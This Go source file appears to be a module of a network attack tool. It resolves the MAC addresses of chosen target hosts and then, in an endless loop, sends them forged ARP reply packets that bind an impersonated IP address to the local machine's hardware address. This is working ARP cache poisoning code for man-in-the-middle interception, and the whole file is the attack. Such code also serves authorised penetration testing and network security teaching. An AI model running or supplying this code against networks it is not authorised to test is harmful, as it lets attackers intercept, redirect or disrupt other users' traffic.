package main

import (
	"fmt"
	"github.com/mdlayher/arp"
	"net"
	"net/netip"
	"time"
)

type POISON_TARGET struct {
	IP  netip.Addr
	MAC net.HardwareAddr
}

var IMPERSONATE_IP netip.Addr
var POISON_TARGETS []POISON_TARGET
var LOCAL_HARDWARE_ADDR net.HardwareAddr

func LoadPoisonTargets(targetIps []netip.Addr) error {
	iface, err := net.InterfaceByName(OPTIONS.INTERFACE)
	if err != nil {
		return err
	}
	client, err := arp.Dial(iface)
	if err != nil {
		return err
	}
	for _, eachIp := range targetIps {
		var newPoisonTarget POISON_TARGET
		deadline := time.Now().Add(time.Duration(OPTIONS.ARP_TIMEOUT) * time.Second)
		client.SetDeadline(deadline)
		mac, err := client.Resolve(eachIp)
		if err != nil {
			LogStatus(MODE_POISON, fmt.Sprintf("failed to resolve MAC for %s: %s. skipping", eachIp, err), true, false)
			continue
		}
		newPoisonTarget.IP = eachIp
		newPoisonTarget.MAC = mac
		POISON_TARGETS = append(POISON_TARGETS, newPoisonTarget)
	}
	client.Close()
	return nil
}

func SendArpPoison(client arp.Client, target POISON_TARGET) {
	if response, err := arp.NewPacket(arp.OperationReply, LOCAL_HARDWARE_ADDR, IMPERSONATE_IP, target.MAC, target.IP); err == nil {
		if err = client.WriteTo(response, target.MAC); err != nil {
			LogStatus(MODE_POISON, fmt.Sprintf("failed to send arp poison packet: %s", err), true, false)
		}
	} else {
		LogStatus(MODE_POISON, fmt.Sprintf("failed to build arp poison packet: %s", err), true, false)
	}
	LogStatus(MODE_POISON, fmt.Sprintf("sent ARP poison packet to %s", target.IP), false, true)
}

func Poison() {
	for {
		for _, eachTarget := range POISON_TARGETS {
			iface, _ := net.InterfaceByName(OPTIONS.INTERFACE)
			client, _ := arp.Dial(iface)
			SendArpPoison(*client, eachTarget)
			client.Close()
		}
		time.Sleep(time.Duration(OPTIONS.POISON_INTERVAL) * time.Second)
	}
}
